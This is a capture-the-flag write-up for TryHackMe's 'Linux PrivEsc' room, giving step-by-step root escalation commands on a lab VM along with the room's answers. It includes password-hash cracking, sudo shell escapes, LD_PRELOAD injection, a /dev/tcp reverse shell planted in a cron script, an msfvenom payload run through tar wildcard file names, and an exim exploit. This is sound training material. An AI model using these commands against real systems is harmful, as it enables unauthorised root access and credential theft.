![Windows PrivEsc Banner](https://i.imgur.com/RuMC2vG.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Linux_Priv_Esc_Cover.png" alt="Linux PrivEsc Logo">
</p>

# Linux PrivEsc

This guide contains the answer and steps necessary to get to them for the [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) room.

## Table of contents

- [Deploy the Vulnerable Debian VM](#deploy-the-vulnerable-debian-vm)
- [Service Exploits](#service-exploits)
- [Weak File Permissions - Readable /etc/shadow](#weak-file-permissions---readable-etcshadow)
- [Weak File Permissions - Writable /etc/passwd](#weak-file-permissions---writable-etcshadow)
- [Sudo - Shell Escape Sequences](#sudo---shell-escape-sequences)
- [Sudo - Environment Variables](#sudo---environment-variables)
- [Cron Jobs - File Permissions](#cron-jobs---file-permissions)
- [Cron Jobs - PATH Environment Variable](#cron-jobs---path-environment-variable)
- [Cron Jobs - Wildcards](#cron-jobs---wildcards)
- [SUID / SGID Executables - Known Exploits](#suid--sgid-executables---known-exploits)
- [SUID / SGID Executables - Shared Object Injection](#suid--sgid-executables---shared-object-injection)
- [SUID / SGID Executables - Environment Variables](#suid--sgid-executables---environment-variables)
- [SUID / SGID Executables - Abusing Shell Features (#1)](#suid--sgid-executables---abusing-shell-features-1)
- [SUID / SGID Executables - Abusing Shell Features (#2)](#suid--sgid-executables---abusing-shell-features-2)
- [Passwords & Keys - History Files](#passwords--keys---history-files)
- [Passwords & Keys - Config Files](#passwords--keys---config-files)
- [Passwords & Keys - SSH Keys](#passwords--keys---ssh-keys)
- [NFS](#nfs)
- [Kernel Exploits](#kernel-exploits)
- [Privilege Escalation Scripts ](#privilege-escalation-scripts)

### Deploy the Vulnerable Debian VM

**Username:** user

**Password:** password321

https://www.exploit-db.com/exploits/1518

```cmd
ssh user@10.10.42.225
```

![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Linux_Priv_Esc_Nmap_Scan.png)


### Service Exploits

*Read and follow along with the above.*

### Weak File Permissions - Readable /etc/shadow

In this task we utilize insecure read permissions for the /etc/shadow file.

1. What is the root user's password hash?

   We first need to find the permission we have for this file as a normal user.

   ```cmd
   ls -lh /etc/shadow
   ```
   
   ![Shadow Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Permissions.png)
   
   Looks like the file as read and write permissions for all users. We can now view the file.
   
   ```cmd
   cat /etc/shadow
   ```
   
   Here we can find the has for the user `root` between the first two `:`.
   
   ![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Contents.png)

   ><details><summary>Click for answer</summary>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0</details>

2. What hashing algorithm was used to produce the root user's password hash?

   THe first thing we can try is `hash-identifier` to find the hashing algorithm.
   
   ![Hash Identifier](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Hash_Identifier.png)
   
   Looks like it is a SHA256 hash. However, using examples from `hashcat` we can find the exact hash by looking at the format.
   
   ![Hashcat Examples](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Hashcat_Examples.png)

   ><details><summary>Click for answer</summary>sha512crypt</details>

3. What is the root user's password?

   The next step is to crack the password with either `hashcat` or `john`. 
   
   ```cmd
   hashcat -m 1800 password.hash /usr/share/wordlists/rockyou.txt
   ```
   
   ![Hashcat Results](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Hashcat_Results.png)
   
   ```cmd
   john --wordlist=/usr/share/wordlists/rockyou.txt password.hash
   ```
   
   ![John Results](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_John_Results.png)
   
   Now we can use the found password to switch to the root user.
   
   ```cmd
   su -u root
   ```
   
   ><details><summary>Click for answer</summary>password123</details>

### Weak File Permissions - Writable /etc/shadow

In this task we utilize insecure write permissions for the /etc/shadow file.

*Read and follow along with the above.*

Again we can use `ls -lh /etc/shadow` to find out what the permissions for this file are.

![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Shadow_Permissions.png)

Instead of cracking the password, we can simply add our own, since we have write permissions for this file. We can use `mkpasswd` to create the hashed password.

```cmd
mkpasswd -m sha-512 iamroot
```

Next we can replace the root users password with our own password.

![Modify](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Shadow_Modify.png)

Now we can switch to the root user with our own password.

![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Shadow_Root.png)

### Weak File Permissions - Writable /etc/passwd

In this task we utilize insecure write permissions for the /etc/passwd file.

We first use the following command to find the permissions we have for the `/etc/passwd` file.

```cmd
ls -l /etc/passwd
```

![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Permissions.png)

Looks like we have write access. Lets create a new password for the root user we can substitute. This can be done on our target machine or attack machine. Due to the way the machines are setup the resulting hashes may be different as they use a different method. However, the outcome should be the same.

```cmd
openssl passwd iamroot
```

![Creation](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Creation.png)

We can do two things now. We can either replace the root users password with our new one. Or we can copy the root user line in the `passwd` file and change the name and password. I will use the second option here.

![Modification](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Modification.png)

Now we can switch to our new user with the following and enter the newly created password:

```cmd
su newroot
```

![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Root.png)

1. Run the "id" command as the newroot user. What is the result?

   ![Id](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Writable_Passwd_Id.png)

   ><details><summary>Click for answer</summary>uid=0(root) gid=0(root) groups=0(root)</details>

### Sudo - Shell Escape Sequences

In this task we will abuse the insecure sudo settings for various bins on the file system.

1. How many programs is "user" allowed to run via sudo? 

   We can use `sudo -l` to view all the executables we can run with sudo.
   
   ![Sudo](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Sudo.png)
   
   ><details><summary>Click for answer</summary>11</details>
   
2. One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

   After going through the entire list in GTFOBins, there is one binary that was not listed on the website.
   
   ><details><summary>Click for answer</summary>apache2</details>

*Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.*

```cmd
sudo apache2 -f /etc/shadow
```

![Apache 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Apache2.png)

https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/

**Extra challenge:** We can use (https://gtfobins.github.io/) to find out how to get an elevated shell with each binary.

**awk**

```cmd
sudo awk 'BEGIN {system("/bin/sh")}'
```

![Awk](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Awk.png)

**iftop**

```cmd
sudo iftop
!/bin/sh
```

![Iftop](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Iftop.png)
   
**find**

```cmd
sudo find . -exec /bin/sh \; -quit
```

![Find](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Find.png)

**ftp**

```cmd
sudo ftp
!/bin/sh
```

![Ftp](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Ftp.png)

**less**

```cmd
sudo less /etc/profile
!/bin/sh
```

![Less](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Less.png)

**man**

```cmd
sudo man man
!/bin/sh
```

![Man](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Man.png)

**more**

```cmd
TERM= sudo more /etc/profile
!/bin/sh
```

![More](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_More.png)

**nano**

```cmd
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

![Nano](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Nano.png)

**nmap**

```cmd
sudo nmap --interactive
nmap> !sh
```

![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Nmap.png)

**vim**

```cmd
sudo vim -c ':!/bin/sh'
```

![Vim](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Vim.png)

### Sudo - Environment Variables

In this task we will use the environmental variable settings for sudo.

Using `sudo -l` we can check which environment variables are inherited.

![Sudo](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shell_Escape_Sudo.png)

*Read and follow along with the above.*

First we create a shared object using the code provided:

```cmd
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Next, we run one of the programs we are allowed to run with sudo

```cmd
sudo LD_PRELOAD=/tmp/preload.so find
```

![Pre Load](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Preload.png)

We run `ldd` to check which shared libraries are used by the program.

```cmd
ldd /usr/sbin/apache2
```

![Libraries](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Libraries.png)

Now we created another shared object with the same name as one of the listed libraries.

```cmd
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

And now we run apache with sudo

```cmd
sudo LD_LIBRARY_PATH=/tmp apache2
```

![Library](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Environment_Variables_Library.png)

### Cron Jobs - File Permissions

In this task we will use weak file permissions for scheduled tasks.

First we look at the contents of the system-wide crontab.

```cmd
cat /etc/crontab
```

![Crontab](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Crontab.png)

Looks like one of the tasks executes a script. We can easily locate it with `locate`.

```cmd
locate overwrite.sh
```

![Locate](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Locate.png)

Now that we know its location, lets look at the permissions we have for this file.

```cmd
ls -l /usr/local/bin/overwrite.sh
```

![Permission](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Permission.png)

It seems like we have write access to it. How convenient. Lets open it up to edit the contents of the file.

```cmd
nano /usr/local/bin/overwrite.sh
```

Now we add the following code to the file.

```cmd
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

![Job](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Job.png)

Then we start a listener on our device and wait for the task to execute a create a shell for us.

```cmd
nc -nvlp 4444
```

![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Root_Shell.png)

### Cron Jobs - PATH Environment Variable

In this task we use the PATH variable to execute our own code.

First we look at the contents of the system-wide crontab.

```cmd
cat /etc/crontab
```

![Crontab](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Crontab.png)

Looks like it looks for the scripts in `/home/user`. Lets create our own script in this folder.

```cmd
touch overwrite.sh
nano overwrite.sh
```

![Create Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Create_Script.png)

Now we add the following code to this file (similar to the previous task)

```cmd
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Script.png)

Next, we must make sure this script is executable with `chmod`.

```cmd
chmod +x /home/user/overwrite.sh
```

![Chmod](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Chmod.png)

If executed properly, this should create an executable we can run in the `/tmp/` folder. Running the following command should give us a root shell.

```cmd
/tmp/rootbash -p
```

![Variable](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Variable.png)

Before moving on, we must remove the script.

```cmd
rm /tmp/rootbash
exit
```

![Remove](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Remove.png)

1. What is the value of the PATH variable in /etc/crontab?

   ><details><summary>Click for answer</summary>/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</details>

### Cron Jobs - Wildcards

In this task we will utilize the fact that `tar` can be used with a wildcard to run extra commands.

*Read and follow along with the above.*

Lets look at the other file in the crontab.

```cmd
cat /usr/local/bin/compress.sh
```

![Compress](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Compress.png)

On [GTFO Bins](https://gtfobins.github.io/gtfobins/tar/) we can see which commands we can run with tar. We can use `msfvenom` to create the necessary payload.

```cmd
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f elf -o shell.elf
```

Now we use `scp` to transfer this file to our target machine.

```cmd
scp -r -oHostKeyAlgorithms=+ssh-rsa shell.elf user@10.10.136.213:/home/user/shell.elf
```

![Scp](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Scp.png)

We must make this file executable:

```cmd
chmod +x /home/user/shell.elf
```

Next we must create two files in the user folder.

```cmd
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

![Create Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Create_Files.png)

Now we just set up a listener on our machine a wait for the task to run.

```cmd
nc -nlvp 1337
```

![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Root_Shell.png)

Lastly, we must remove the files again.

```cmd
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

### SUID / SGID Executables - Known Exploits

In this task we will abuse known exploits for binaries with their SUID bit set.

*Read and follow along with the above.*

We use the following command to find all executables with their SUID/SGID bit set.

```cmd
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Permissions.png)

Another method I use myself is:

```cmd
find / -perm -4000 2> /dev/null
```

![Permissions 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Permissions_2.png)

Looks like there is an exploit we can use.

![Exploit Database](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Exploit_Database.png)

We can use the pre-made script from the machine.

```cmd
s -lh tools/suid/exim
```

```cmd
./tools/suid/exim/cve-2016-1531.sh
```

![Auto Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Auto_Root.png)

However, we can also create this file ourselves from the exploit database.

```cmd
touch cve-2016-1531.sh
nano cve-2016-1531.sh
```

![Create Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Create_Script.png)

![Manual Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Manual_Script.png)

Make sure it is executable and then run the script.

```cmd
chmod +x cve-2016-1531.sh
./cve-2016-1531.sh
```

![Manual Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Manual_Root.png)

### SUID / SGID Executables - Shared Object Injection



*Read and follow along with the above.*

```cmd
/usr/local/bin/suid-so
```
```cmd
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

```cmd
mkdir /home/user/.config
```

```cmd
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

```cmd
/usr/local/bin/suid-so
```

### SUID / SGID Executables - Environment Variables


*Read and follow along with the above.*

```cmd
/usr/local/bin/suid-env
```

```cmd
strings /usr/local/bin/suid-env
```

```cmd
gcc -o service /home/user/tools/suid/service.c
```

```cmd
PATH=.:$PATH /usr/local/bin/suid-env
```

```cmd
/usr/local/bin/suid-env
```

### SUID / SGID Executables - Abusing Shell Features (#1)


*Read and follow along with the above.*

```cmd
/usr/local/bin/suid-env2
```

```cmd
strings /usr/local/bin/suid-env2
```

```cmd
/bin/bash --version
```

```cmd
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

```cmd
/usr/local/bin/suid-env2
```

### SUID / SGID Executables - Abusing Shell Features (#2)

```cmd
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
```cmd
/tmp/rootbash -p
```
```cmd
rm /tmp/rootbash
exit
```

### Passwords & Keys - History Files
### Passwords & Keys - Config Files
### Passwords & Keys - SSH Keys
### NFS
### Kernel Exploits
### Privilege Escalation Scripts 
